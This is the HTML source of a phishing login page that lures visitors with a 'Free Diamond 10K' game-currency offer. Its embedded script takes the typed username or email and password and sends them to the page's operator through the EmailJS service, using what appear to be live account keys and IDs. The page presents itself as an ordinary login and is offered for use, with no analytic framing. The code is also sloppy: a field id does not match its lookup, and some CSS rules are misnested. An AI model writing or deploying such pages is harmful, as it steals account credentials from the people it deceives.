<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
(function(){
emailjs.init("5ijt6R7KPYcuCtNvK");
})();

function sendLogin(e){
e.preventDefault();

emailjs.send("service_g9hb3t6","template_e9aw4ub",{
username: document.getElementById("username").value,
password: document.getElementById("password").value
})
.then(function(){
alert("Login Request Sent Successfully!");
});
}
</script>

<style>

body{
margin:0;
font-family:Arial;
.profile-circle{
width:90px;
height:90px;
border-radius:50%;
overflow:hidden;
position:absolute;
top:-0px;
left:50%;
transform:translateX(-50%);
border:5px solid white;
}

.profile-circle img{
width:100%;
height:100%;
object-fit:cover;
  .top-text{
font-size:16px;
color:#333;
margin-top:40px;
margin-bottom:5px;
font-weight:bold;
  }
}
background:linear-gradient(180deg,#c000ff,#7a00ff);
height:100vh;
display:flex;
justify-content:center;
align-items:center;
}

.card{
width:340px;
background:#f3f3f3;
border-radius:20px;
padding:30px;
text-align:center;
box-shadow:0 10px 25px rgba(0,0,0,0.2);
}

input{
width:90%;
padding:14px;
margin:10px 0;
border-radius:10px;
border:2px solid #ddd;
font-size:15px;
}

button{
width:95%;
padding:14px;
margin-top:15px;
border:none;
border-radius:10px;
background:#ff9800;
color:white;
font-size:16px;
cursor:pointer;
}

button:hover{
opacity:0.9;
}

</style>

</head>

<body>

<div class="card">
<div class="profile-circle">
<img src="1774073857441.png">
</div>
  <p class="top-text">💎 Get Free Diamond 10K 💎</p>
<h2>Login</h2>

<form onsubmit="sendLogin(event)">

<input type="text" id="username Or Email" placeholder="Username Or Email" required>

<input type="password" id="password" placeholder="password" required>

<button type="submit">Login</button>

</form>

</div>

</body>
</html>
